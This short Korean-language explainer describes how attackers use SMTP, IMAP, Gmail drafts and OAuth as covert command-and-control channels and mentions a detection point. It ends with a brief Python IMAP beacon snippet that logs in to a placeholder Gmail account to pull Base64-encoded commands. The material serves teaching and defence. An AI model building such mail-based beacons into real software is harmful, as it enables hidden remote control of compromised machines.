SMTP/IMAP을 이용한 은밀한 C2 통신 채널

#1. 메일 프로토콜 C2란?

📧 ➜ 📡 ➜ 🎭 ➜ 💀

"이메일로 명령을 주고받다"

공격자는 SMTP, IMAP, POP3를 C2 채널로 악용합니다. 감염된 PC가 특정 메일 계정을 주기적으로 확인하여 명령을 수신하고, 결과를 메일로 회신합니다. Gmail/Outlook 같은 합법적 서비스를 사용하면 도메인 차단이 불가능합니다.

Draft 기반 C2의 은밀함

이메일을 보내지 않고 임시보관함(Draft)에 명령을 저장하면 발신/수신 로그가 남지 않습니다. 공격자와 악성코드가 같은 계정의 Draft를 공유하여 통신합니다.

#2. 공격 기법 분석

Gmail/OAuth C2

Gmail API + OAuth 토큰으로 C2 채널을 구성합니다. 합법적 Google 서비스이므로 도메인 기반 차단이 불가능하며, TLS 암호화로 내용 검사도 어렵습니다.

IMAP/SMTP 직접 통신

Python imaplib/smtplib으로 메일 서버에 직접 접속합니다. 이메일 클라이언트 없이 스크립트로 통신하므로 비정상 프로세스의 메일 서버 접속이 핵심 탐지 포인트입니다.

실전 예시: IMAP C2 Beacon

Python으로 Gmail IMAP에 접속하여 Base64 인코딩된 명령을 수신합니다.

# IMAP C2 Beacon
m = imaplib.IMAP4_SSL('imap.gmail.com')
m.login('c2drop@gmail.com', 'app_password')
_, msgs = m.search(None, 'SUBJECT "task_"')
# Subject: task_cmd / Body: Base64(whoami)
